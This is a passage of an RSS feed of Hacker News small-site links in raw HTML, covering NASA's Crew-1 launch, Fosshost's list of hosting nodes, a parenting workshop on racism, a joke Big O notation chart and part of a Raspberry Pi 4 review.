https://i0.wp.com/maggrand.com/wp-content/uploads/2020/11/123968368_167377225042487_7862924137847646970_n.jpg?resize=300%2C300&amp;ssl=1 300w, https://i0.wp.com/maggrand.com/wp-content/uploads/2020/11/123968368_167377225042487_7862924137847646970_n.jpg?resize=150%2C150&amp;ssl=1 150w, https://i0.wp.com/maggrand.com/wp-content/uploads/2020/11/123968368_167377225042487_7862924137847646970_n.jpg?resize=768%2C768&amp;ssl=1 768w, https://i0.wp.com/maggrand.com/wp-content/uploads/2020/11/123968368_167377225042487_7862924137847646970_n.jpg?resize=640%2C640&amp;ssl=1 640w, https://i0.wp.com/maggrand.com/wp-content/uploads/2020/11/123968368_167377225042487_7862924137847646970_n.jpg?w=1080&amp;ssl=1 1080w" sizes="(max-width: 678px) 100vw, 678px" data-recalc-dims="1"></figure>



<p>The National Aeronautics and Space Administration (NASA) NASA is inviting the public to take part in virtual activities and events ahead of the launch the agency’s SpaceX Crew-1 mission with astronauts to the International Space Station.</p>



<p>In just seven days (Nov. 14) the spacecraft will launch atop a SpaceX Falcon 9 rocket carrying astronauts Michael Hopkins, Victor Glover, and Shannon Walker, along with Japan Aerospace Exploration Agency astronaut Soichi Noguchi to the space station for a six-month science mission. ⁣The launch marks the first fully certified crew rotation flight of a commercial space vehicle, making it the first of regular flights for our Commercial Crew Program.⁣ NASA revealed in an <a href="https://www.instagram.com/p/CHS8IfKpEbD/?utm_source=ig_web_copy_link" target="_blank" rel="noreferrer noopener">Instagram post</a>.</p>



<figure><img data-attachment-id="1383" data-permalink="https://maggrand.com/nasas-spacex-crew-1-mission-is-launching-on-nov-14/nasa/" data-orig-file="https://i2.wp.com/maggrand.com/wp-content/uploads/2020/11/nasa.jpg?fit=1920%2C1280&amp;ssl=1" data-orig-size="1920,1280" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="nasa" data-image-description="" data-medium-file="https://i2.wp.com/maggrand.com/wp-content/uploads/2020/11/nasa.jpg?fit=300%2C200&amp;ssl=1" data-large-file="https://i2.wp.com/maggrand.com/wp-content/uploads/2020/11/nasa.jpg?fit=678%2C452&amp;ssl=1" loading="lazy" width="678" height="452" src="https://i2.wp.com/maggrand.com/wp-content/uploads/2020/11/nasa.jpg?resize=678%2C452&amp;ssl=1" alt="NASA astronauts" srcset="https://i2.wp.com/maggrand.com/wp-content/uploads/2020/11/nasa.jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i2.wp.com/maggrand.com/wp-content/uploads/2020/11/nasa.jpg?resize=300%2C200&amp;ssl=1 300w, https://i2.wp.com/maggrand.com/wp-content/uploads/2020/11/nasa.jpg?resize=768%2C512&amp;ssl=1 768w, https://i2.wp.com/maggrand.com/wp-content/uploads/2020/11/nasa.jpg?resize=1536%2C1024&amp;ssl=1 1536w, https://i2.wp.com/maggrand.com/wp-content/uploads/2020/11/nasa.jpg?resize=640%2C427&amp;ssl=1 640w, https://i2.wp.com/maggrand.com/wp-content/uploads/2020/11/nasa.jpg?w=1920&amp;ssl=1 1920w, https://i2.wp.com/maggrand.com/wp-content/uploads/2020/11/nasa.jpg?w=1356&amp;ssl=1 1356w" sizes="(max-width: 678px) 100vw, 678px" data-recalc-dims="1"><figcaption>Pilot Victor Glover, spacecraft commander Michael Hopkins, mission specialist Soichi Noguchi, and mission specialist Shannon Walker participate in a SpaceX training exercise on July 22, 2020, at Kennedy. Photo credit: SpaceX</figcaption></figure>



<p>This mission will mark the first crew rotation mission with four astronauts flying on a commercial spacecraft, and the first including an international partner.</p>



<p>Are you ready? Watch live NASA TV coverage of this historic mission starting at 3:30 p.m. EST (8:30 p.m. UTC) on Nov. 14. Liftoff is scheduled for 7:49 p.m. EST (12:49 a.m. UTC). </p>



<p>The Crew Dragon is scheduled to dock to the space station at 4:20 a.m. Sunday, Nov. 15. Launch, prelaunch activities, and docking will air live on NASA Television and the agency’s <a href="http://www.nasa.gov/live" target="_blank" rel="noreferrer noopener">website</a>.</p>



<p>People can also register via NASA’s Facebook <a href="https://www.facebook.com/events/2784819011845807/" target="_blank" rel="noreferrer noopener">event page</a>.</p>

	</div></article></div>]]>
            </description>
            <link>https://maggrand.com/nasas-spacex-crew-1-mission-is-launching-on-nov-14/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25016505</guid>
            <pubDate>Sat, 07 Nov 2020 17:24:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fosshost launches ARMv8 64-bit eMAG]]>
            </title>
            <description>
<![CDATA[
Score 34 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25016045">thread link</a>) | @fosshost
<br/>
November 7, 2020 | https://fosshost.org/about | <a href="https://web.archive.org/web/*/https://fosshost.org/about">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-30c5a225=""><div data-v-257fbba2=""><div data-v-257fbba2=""><p data-v-257fbba2="">The fosshost project is a non-profit organisation that exists to serve the hosting needs of the global open source community.</p>
<p data-v-257fbba2="">We're on a mission to empower and support every free and open source software project. To go further, together. Our work never stops. </p>
<p data-v-257fbba2="">Today, we help provide world-class hosting services to more than seventy open source projects.</p>
<p data-v-257fbba2="">We operate several nodes which are usually donated by our hosting sponsors, and manage the infrastructure donated to us, on behalf of the projects we help.  You can read more about the projects we help <a href="https://fosshost.org/projects">here</a>. </p>
<p data-v-257fbba2="">Those open source projects eligible for our services, typically apply for a virtual private server (VPS).  This is typically provided with the following specification, but can be increased, upon request.</p>
<ul data-v-257fbba2="">
<li data-v-257fbba2="">6 vCPU</li>
<li data-v-257fbba2="">8GB Memory</li>
<li data-v-257fbba2="">400GB Storage</li>
<li data-v-257fbba2="">IPv4 / IPv6 connectivity</li>
<li data-v-257fbba2="">Full Remote SSH Access</li>
</ul>
<p data-v-257fbba2="">We support most operating systems including CentOS, Debian, Ubuntu, Gentoo, ArchLinux, Fedora and FreeBSD. We support custom OS.</p>
<p data-v-257fbba2="">Other services we provide include web, email, database, communication, domain, DNS and storage hosting.  You can apply for all of our services via the <a href="https://fosshost.org/apply">application</a> form, or read more about the services we offer <a href="https://docs.fosshost.org/" rel="nofollow noopener noreferrer" target="_blank" data-v-257fbba2="">here</a>.</p>
<h2 id="our-network" data-v-257fbba2="">Our network</h2>
<p data-v-257fbba2="">The project operates a large and global infrastructure across multiple continents in world-class facilities.  Projects can select which region they want their services deploying on.</p>
<p data-v-257fbba2="">Maidenhead, United Kingdom (Node 1):<br data-v-257fbba2="">
Facility: iomart DC5 Maidenhead<br data-v-257fbba2="">
Dual Xeon 2630, 64GB RAM and 8x2TB SATA (RAID 10)<br data-v-257fbba2="">
IPv4 only supported<br data-v-257fbba2="">
Network Connectivity: 1000Mbps<br data-v-257fbba2="">
Test IP: 185.35.79.69<br data-v-257fbba2="">
Network Info:&nbsp;<a href="https://ipinfo.io/185.35.79.69" rel="nofollow noopener noreferrer" target="_blank" data-v-257fbba2="">https://ipinfo.io/185.35.79.69</a></p>
<p data-v-257fbba2="">Newark, United Kingdom (Node 2):<br data-v-257fbba2="">
Facility: Timico Newark<br data-v-257fbba2="">
Dual Xeon 2136, 64GB RAM and 2x1TB SSD (RAID 1)<br data-v-257fbba2="">
IPv4 only supported<br data-v-257fbba2="">
Network Connectivity: 100Mbps<br data-v-257fbba2="">
Test IP: 37.61.232.244<br data-v-257fbba2="">
Network Info:&nbsp;<a href="https://ipinfo.io/37.61.232.244" rel="nofollow noopener noreferrer" target="_blank" data-v-257fbba2="">https://ipinfo.io/37.61.232.244</a></p>
<p data-v-257fbba2="">Chicago, United States (Node 3):<br data-v-257fbba2="">
Facility: zColo Chicago<br data-v-257fbba2="">
Dual Xeon 5520, 72GB RAM and 4x3TB SATA (RAID 10)<br data-v-257fbba2="">
IPv4 and IPv6 supported<br data-v-257fbba2="">
Network Connectivity: 1000Mbps<br data-v-257fbba2="">
Test IP: 192.240.104.4<br data-v-257fbba2="">
Network Info:&nbsp;<a href="https://ipinfo.io/192.240.104.4" rel="nofollow noopener noreferrer" target="_blank" data-v-257fbba2="">https://ipinfo.io/192.240.104.4</a></p>
<p data-v-257fbba2="">Los Angeles, United States (Node 4 and 5):<br data-v-257fbba2="">
Facility: zColo Los Angeles<br data-v-257fbba2="">
Dual Xeon 5520, 72GB RAM and 4x3TB SATA (RAID 10)<br data-v-257fbba2="">
IPv4 and IPv6 supported<br data-v-257fbba2="">
Network Connectivity: 1000Mbps<br data-v-257fbba2="">
Test IP: 192.240.120.250<br data-v-257fbba2="">
Network Info:&nbsp;<a href="https://ipinfo.io/192.240.120.250" rel="nofollow noopener noreferrer" target="_blank" data-v-257fbba2="">https://ipinfo.io/192.240.120.250</a></p>
<p data-v-257fbba2="">Warsaw, Poland (Node 6):<br data-v-257fbba2="">
Facility: LIM Warsaw<br data-v-257fbba2="">
Dual Xeon 5620, 48GB RAM and 2x900GB SAS (RAID 1)<br data-v-257fbba2="">
IPv4 only supported<br data-v-257fbba2="">
Network Connectivity: 1000Mbps<br data-v-257fbba2="">
Test IP: 109.232.240.226<br data-v-257fbba2="">
Network Info:&nbsp;<a href="https://ipinfo.io/109.232.240.226" rel="nofollow noopener noreferrer" target="_blank" data-v-257fbba2="">https://ipinfo.io/109.232.240.226</a></p>
<p data-v-257fbba2="">Meppel, Netherlands (Node 7)<br data-v-257fbba2="">
Facility: Serverius SDC2<br data-v-257fbba2="">
Dual Xeon 2620, 32GB RAM and 4x3TB (RAID 1)<br data-v-257fbba2="">
IPv4 only supported<br data-v-257fbba2="">
Network Connectivity: 100Mbps<br data-v-257fbba2="">
Test IP: 146.0.73.72<br data-v-257fbba2="">
Network Info:&nbsp;<a href="https://ipinfo.io/146.0.73.72" rel="nofollow noopener noreferrer" target="_blank" data-v-257fbba2="">https://ipinfo.io/146.0.73.72</a></p>
<p data-v-257fbba2="">Meppel, Netherlands (Node 8)<br data-v-257fbba2="">
Facility: Serverius SDC2<br data-v-257fbba2="">
Dual Xeon 2620, 62GB RAM and 4x3TB (RAID 1)<br data-v-257fbba2="">
IPv4 only supported<br data-v-257fbba2="">
Network Connectivity: 1000Mbps<br data-v-257fbba2="">
Test IP: 5.255.91.1<br data-v-257fbba2="">
Network Info:&nbsp;<a href="https://ipinfo.io/5.255.91.1" rel="nofollow noopener noreferrer" target="_blank" data-v-257fbba2="">https://ipinfo.io/5.255.91.1</a></p>
<p data-v-257fbba2="">North Dallas, United States (Node 9 and 10)<br data-v-257fbba2="">
Facility: DataBank DFW2<br data-v-257fbba2="">
Dual Xeon 2620, 128GB RAM and x2 480GB SSD, x1 128GB SSD, x12 2TB<br data-v-257fbba2="">
IPv4 and IPv6 supported<br data-v-257fbba2="">
Network Connectivity: x2 10Gbps (Bonded)<br data-v-257fbba2="">
Test IP: 139.178.85.253<br data-v-257fbba2="">
Network Info: <a href="https://ipinfo.io/139.178.85.253" rel="nofollow noopener noreferrer" target="_blank" data-v-257fbba2="">https://ipinfo.io/139.178.85.253</a></p>
<p data-v-257fbba2="">Oregon, United States (Node 11)<br data-v-257fbba2="">
Facility: OSUOSL Corvallis<br data-v-257fbba2="">
Dual Xeon 5690, 64GB RAM and x6 2TB (RAID6)<br data-v-257fbba2="">
IPv4 and IPv6 supported<br data-v-257fbba2="">
Network Connectivity: 1000Mbps<br data-v-257fbba2="">
Test IP: 140.211.9.133<br data-v-257fbba2="">
Network Info: <a href="https://ipinfo.io/140.211.9.133" rel="nofollow noopener noreferrer" target="_blank" data-v-257fbba2="">https://ipinfo.io/140.211.9.133</a></p></div></div></div></div>]]>
            </description>
            <link>https://fosshost.org/about</link>
            <guid isPermaLink="false">hacker-news-small-sites-25016045</guid>
            <pubDate>Sat, 07 Nov 2020 16:36:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Talking to Kids About Racism: A workshop for families]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25016009">thread link</a>) | @actfrench
<br/>
November 7, 2020 | https://schoolclosures.org/racismfamilyworkshop | <a href="https://web.archive.org/web/*/https://schoolclosures.org/racismfamilyworkshop">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page" role="main">
        
          <article data-page-sections="5ee922605896723bce8457c4" id="sections">
  
    <section data-section-id="5ee922605896723bce8457ca" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
&quot;imageOverlayOpacity&quot;: 0.15,
&quot;video&quot;: {
&quot;playbackSpeed&quot;: 0.5,
&quot;filter&quot;: 1,
&quot;filterStrength&quot;: 0,
&quot;zoom&quot;: 0
},
&quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
&quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
&quot;customSectionHeight&quot;: 85,
&quot;horizontalAlignment&quot;: &quot;horizontal-alignment--left&quot;,
&quot;verticalAlignment&quot;: &quot;vertical-alignment--bottom&quot;,
&quot;contentWidth&quot;: &quot;content-width--medium&quot;,
&quot;sectionTheme&quot;: &quot;black&quot;,
&quot;sectionAnimation&quot;: &quot;none&quot;,
&quot;backgroundMode&quot;: &quot;image&quot;
}" data-animation="none">
  
  <div>
    <div>
      
      
      
      <div data-type="page-section" id="page-section-5ee922605896723bce8457ca"><div><div><div data-block-type="2" id="block-ea9e4d3fce606cb02e83"><p><h3>Talking to Kids About Racism: a workshop for parents and caregivers</h3><h4>Sunday, November 15th<br>West Coast: 10am<br>East Coast : 1pm </h4></p></div><div data-block-type="2" id="block-yui_3_17_2_1_1604763839131_12903"><p><em>*Please not that this workshop will be recorded and distributed to the general public.</em></p></div></div></div></div>
    </div>
  </div>
</section>

  
    <section data-section-id="5ee922605896723bce8457cc" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
&quot;imageOverlayOpacity&quot;: 0.15,
&quot;video&quot;: {
&quot;playbackSpeed&quot;: 0.5,
&quot;filter&quot;: 1,
&quot;filterStrength&quot;: 0,
&quot;zoom&quot;: 0
},
&quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
&quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
&quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
&quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
&quot;contentWidth&quot;: &quot;content-width--wide&quot;,
&quot;sectionAnimation&quot;: &quot;none&quot;,
&quot;backgroundMode&quot;: &quot;image&quot;
}" data-animation="none">
  
  <div>
    <div>
      
      
      
      <div data-type="page-section" id="page-section-5ee922605896723bce8457cc"><div><div><div><div><div data-block-type="2" id="block-b66f791c3e13c4baf9b4"><p><h4>Talking about racism and current events with our children can be especially challenging. In these times, our hearts are heavy and so many thoughts are running through our minds. How do we protect our children? How do we teach our children how to NOT be racist? Join Joshua, Vivek &amp; Danielle as they go over ways to talk to your children (all ages) and dig into these hard conversions. They will be going over many topics and having open discussion along with a resource guide to continue to help you in the coming years.</h4></p></div></div></div><div><div><div data-block-type="5" id="block-1200adfec12970ec3776"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e6a9c253331ef1114ad847c/1591201843369-W20JGTTOG1N3BFCXCCSJ/ke17ZwdGBToddI8pDm48kNiEM88mrzHRsd1mQ3bxVct7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0s0XaMNjCqAzRibjnE_wBlkZ2axuMlPfqFLWy-3Tjp4nKScCHg1XF4aLsQJlo6oYbA/IMG_2327.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5e6a9c253331ef1114ad847c/1591201843369-W20JGTTOG1N3BFCXCCSJ/ke17ZwdGBToddI8pDm48kNiEM88mrzHRsd1mQ3bxVct7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0s0XaMNjCqAzRibjnE_wBlkZ2axuMlPfqFLWy-3Tjp4nKScCHg1XF4aLsQJlo6oYbA/IMG_2327.jpg" data-image-dimensions="2500x2500" data-image-focal-point="0.5,0.5" alt="IMG_2327.jpg" data-load="false" data-image-id="5ee922605896723bce8457ba" data-type="image" src="https://schoolclosures.org/IMG_2327.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-e88fd9557560de5a1088"><div><h3>Danielle Brown</h3><p>Danielle Brown is an Early Childhood Educator, Social Justice Educator and Child Advocate. As an Adolescent Trauma and Behavioral Health Specialist, keeping children safe is her priority. She previously helped to direct, organize and teach at a small Christian preschool. As a creative writer, Danielle takes pride in using her words to make a difference. She is the mother of three amazing children who are following in her footsteps.&nbsp;You can find her writings and advocacy work on <a href="https://dearmamarebel.com/?fbclid=IwAR0574cFvWsy7ad-bFf1cKJMvP_K7m_kBaYpPRyDMJyFibOiAsxuuVF0-s4">Dear Mama.</a> </p></div></div></div><div><div data-block-type="5" id="block-78f6ec542d2f116849fe"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e6a9c253331ef1114ad847c/1591201898312-X8ZS3F4J5HZ80Z4P21XL/ke17ZwdGBToddI8pDm48kJrmXzZLBthWuDeh3nqmEOtZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpx0wqjrmTyNKl2gr8KAYmefe6RyZ3neSmM3KIKxDS1KIMp6l-B2AWs-wiWBbLV8YXw/102903629_256213255606144_3443033259796070400_n.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5e6a9c253331ef1114ad847c/1591201898312-X8ZS3F4J5HZ80Z4P21XL/ke17ZwdGBToddI8pDm48kJrmXzZLBthWuDeh3nqmEOtZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpx0wqjrmTyNKl2gr8KAYmefe6RyZ3neSmM3KIKxDS1KIMp6l-B2AWs-wiWBbLV8YXw/102903629_256213255606144_3443033259796070400_n.jpg" data-image-dimensions="704x704" data-image-focal-point="0.5,0.5" alt="102903629_256213255606144_3443033259796070400_n.jpg" data-load="false" data-image-id="5ee922605896723bce8457bf" data-type="image" src="https://schoolclosures.org/102903629_256213255606144_3443033259796070400_n.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-3bb2fed8dd95c4d52d52"><div><h3>Joshua Jernigan</h3><p>Joshua Jernigan is a transgender rights activist and philanthropist living in Charlotte with his husband and daughter. He started the <a href="https://www.gendereducationnetwork.org/">Gender Education Network</a>, an organization helping transgender and gender diverse youth under 12, and is passionate about ensuring every child has a safe and loving home to nurture their growing identities. He also works closely with, and sits on the board for <a href="https://culturalcompassion.org/">The Coalition for Cultural Compassion</a>, a local organization that devotes their time to race education and understanding.&nbsp;</p></div></div></div><div><div data-block-type="5" id="block-8236fc4ab6eb5143f4be"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e6a9c253331ef1114ad847c/1591201979513-NFQVASC3J3FKCGSIS50Y/ke17ZwdGBToddI8pDm48kLdJ3j-ibWYU20S6E0aDMAl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmbFTSCh3GLTYkz25V6Y8urJIuD2y7fSNCnhoa9WQ4jB08vps1ci3DLG5R66hSaaIi/vivek%2Bprofile.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5e6a9c253331ef1114ad847c/1591201979513-NFQVASC3J3FKCGSIS50Y/ke17ZwdGBToddI8pDm48kLdJ3j-ibWYU20S6E0aDMAl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmbFTSCh3GLTYkz25V6Y8urJIuD2y7fSNCnhoa9WQ4jB08vps1ci3DLG5R66hSaaIi/vivek%2Bprofile.jpg" data-image-dimensions="1280x1280" data-image-focal-point="0.5,0.5" alt="vivek+profile.jpg" data-load="false" data-image-id="5ee922605896723bce8457c2" data-type="image" src="https://schoolclosures.org/vivek+profile.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-7388ca2de458483bc05d"><div><h3>Vivek Patel</h3><p>Vivek&nbsp;Patel is a conscious parenting educator who works with families to help create more harmony and connection in their homes.  Vivek&nbsp;has dedicated his life to spreading awareness and supporting change. In schools, he’s worked with youth organizations teaching conflict resolution, anti-bullying and leadership through movement. martial arts and dance.  As a Conscious Parenting educator he has written hundreds of articles and has 60 parenting videos. You can find his writings on <a href="http://www.facebook.com/meaningfulideas%C2%A0">facebook,</a> the <a href="http://meaningfulideas.com/">meaningful ideas website</a> and <a href="http://www.youtube.com/meaningfulideas">youtube</a>. He also hosts a parenting community where parents can get more intimate coaching and support.  <a href="https://www.gentleparentsunite.com/membership" target="_blank">Gentle Parents Unite Membership</a> </p></div></div></div></div><div data-block-type="2" id="block-c2d9de3ff374c1b52234"><div><h3>Details about the event</h3><p><strong>Date: </strong>Sunday, November 15th</p><p><strong>Time: </strong> 10am Pacific Time / 1pm Eastern Time</p><p><strong>Location: </strong>The workshop will be held online on Zoom. Participants will receive a private link with a password upon registration. Please be sure to download zoom ahead of time to participate.</p><p><strong>Cost: </strong>This workshop is free and open to all.  </p><p><em>Please note that this workshop will be recorded and posted online for others to view. </em></p></div></div></div></div></div>
    </div>
  </div>
</section>

  
    <section data-section-id="5ee922605896723bce8457cf" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
&quot;imageOverlayOpacity&quot;: 0.15,
&quot;video&quot;: {
&quot;playbackSpeed&quot;: 0.5,
&quot;filter&quot;: 1,
&quot;filterStrength&quot;: 0,
&quot;zoom&quot;: 0
},
&quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
&quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
&quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
&quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
&quot;contentWidth&quot;: &quot;content-width--narrow&quot;,
&quot;sectionTheme&quot;: &quot;black&quot;,
&quot;sectionAnimation&quot;: &quot;none&quot;,
&quot;backgroundMode&quot;: &quot;image&quot;
}" data-animation="none">
  
  
</section>

  
</article>

          
          
          
        
      </div></div>]]>
            </description>
            <link>https://schoolclosures.org/racismfamilyworkshop</link>
            <guid isPermaLink="false">hacker-news-small-sites-25016009</guid>
            <pubDate>Sat, 07 Nov 2020 16:30:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Alternative Big O Notation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25015973">thread link</a>) | @soygul
<br/>
November 7, 2020 | https://quanticdev.com/algorithms/primitives/alternative-big-o-notation | <a href="https://web.archive.org/web/*/https://quanticdev.com/algorithms/primitives/alternative-big-o-notation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <section id="main_content">
        
<p>I always found things easy to remember when they rhyme, especially with humor. So, here is my take on big O notation, which can help you remember the rankings of big O types:</p>

<div><div><pre><code>O(1) = O(yeah)
O(logn) = O(nice)
O(n) = O(k)
O(n^2) = O(my)
O(2^n) = O(no)
O(n!) = O(mg)
O(n^n) = O(sh*t!)
</code></pre></div></div>

<p>If you want to see my actual article explaining Big O time/space complexity types, here it is:</p>
<ul>
  <li><a href="https://quanticdev.com/algorithms/primitives/big-o-time-space-complexity-types-explained" target="_blank">Big O Time/Space Complexity Types Explained - Logarithmic, Polynomial, Exponential, and More</a></li>
</ul>

<p>If you want to have the alternative Big O notation as a sticker, so you can stick it to unusual places, you can get it from <a href="https://quanticdev.com/shop" target="_blank">quanticdev.com/shop</a>.</p>

<p><a href="https://www.redbubble.com/i/sticker/Alternative-Big-O-Notation-by-quanticdev/54268092.EJUG5" target="_blank"><img src="https://quanticdev.com/algorithms/primitives/alternative-big-o-notation/media/alternative_big_o_notation_sticker.jpg" alt="Alternative Big O Notation Poster"></a></p>

<p>If you really want to confuse fellow software engineers, you can also get it as a small poster, bigger poster, framed print, hoodie, phone case, mug, blanket, or even a shower curtain!</p>

<p><a href="https://www.redbubble.com/shop/ap/54268092" target="_blank"><img src="https://quanticdev.com/algorithms/primitives/alternative-big-o-notation/media/alternative_big_o_notation_poster.jpg" alt="Alternative Big O Notation Poster"></a></p>

<p><strong>Side Note</strong>: Asymptotically, O(n^n) is equal to O(2^n), so the last line in the alternative big O notation list is just for the humor’s sake.</p>

<h2 id="video">Video?</h2>
<p>Did I forget to say that there is also a video version of this article (!)</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/3Jy8s3wdBBQ" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

      </section>
    </div></div>]]>
            </description>
            <link>https://quanticdev.com/algorithms/primitives/alternative-big-o-notation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25015973</guid>
            <pubDate>Sat, 07 Nov 2020 16:26:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[JavaScript Chess Game in 2.1kb]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25015935">thread link</a>) | @joubert
<br/>
November 7, 2020 | https://nanochess.org/chess4.html | <a href="https://web.archive.org/web/*/https://nanochess.org/chess4.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://nanochess.org/chess4.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25015935</guid>
            <pubDate>Sat, 07 Nov 2020 16:20:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Raspberry Pi 4 mini-review]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25015925">thread link</a>) | @todsacerdoti
<br/>
November 7, 2020 | http://sandsoftwaresound.net/raspberry-pi-4-mini-review/ | <a href="https://web.archive.org/web/*/http://sandsoftwaresound.net/raspberry-pi-4-mini-review/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Success with the RTL-SDR Blog V3 software defined radio (SDR) inspired me to try SDR on Raspberry Pi. I pulled out the old Raspberry Pi 2, updated to the latest Raspberry Pi OS (Buster), and installed CubicSDR and GQRX. </p>



<p>Both CubicSDR and GQRX ran, but performance was unacceptably slow. Audio kept breaking up, possibly do to a small audio buffer and/or insufficient CPU cycles. The poor old Raspberry Pi 2 Model B (v1.1) is a 900MHz Broadcom BCM2836 SoC, a quad-core 32-bit ARM Cortex-A7 processor. The RPi 2 has 1GB of RAM. If you would like to know more about its internals, please read about the <a href="http://sandsoftwaresound.net/raspberry-pi/arm11-microarchitecture/">BCM2835 micro-architecture</a>  and <a href="http://sandsoftwaresound.net/perf/">performance analysis with PERF</a> (Performance Events for Linux).</p>



<p>Time to upgrade! I had been meaning to retire the Black Hulk — a 2011 vintage power-sucking LANbox with a Greyhound-era dual-core AMD processor. Upgrading gives me the opportunity to try the latest Raspberry Pi 4 and gain a lot of desktop space. The image below shows my office work space including the Black Hulk and the intsy RPi 4. </p>



<figure><a href="http://sandsoftwaresound.net/wp-content/uploads/2020/11/RPi4_desktop.jpg"><img src="http://sandsoftwaresound.net/wp-content/uploads/2020/11/RPi4_desktop-1024x654.jpg" alt="" srcset="http://sandsoftwaresound.net/wp-content/uploads/2020/11/RPi4_desktop-1024x654.jpg 1024w, http://sandsoftwaresound.net/wp-content/uploads/2020/11/RPi4_desktop-300x192.jpg 300w, http://sandsoftwaresound.net/wp-content/uploads/2020/11/RPi4_desktop-768x490.jpg 768w, http://sandsoftwaresound.net/wp-content/uploads/2020/11/RPi4_desktop-470x300.jpg 470w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Raspberry Pi 4 running CubicSDR software defined radio</figcaption></figure>



<p>I decided to accessorize a little and purchased a Raspberry Pi branded keyboard and mouse. The Raspberry Pi keyboard is a small chiclet keyboard with an internal hub. The internal hub is a welcome addition and postpones the need for an external USB hub. The keyboard has a decent enough feel. It is smaller than the Logitech which it replaces, giving me more desktop space albeit with a slightly cramped hand feel. The Raspberry Pi mouse is just OK. I like the splash of color, too, a nice break from boring black and grey.</p>



<p>Raspberry Pi 4 is faster without question. The desktop and web browser are snappier. RPi 4 boosts the Ethernet port to 1000 BaseT (Gigabit) and you can see it.  </p>



<p>The Raspberry Pi 4 is a 1.5GHz Broadcom BCM2711, a quad-core 64-bit ARM Cortex-A72 processor. I ran an old naive matrix multiplication program and it finished in 0.6 second versus 2.6 seconds on the Raspberry Pi 2. Naturally, I’m curious about the speed-up. I hope to dig into the BCM2711 micro-architecture. </p>



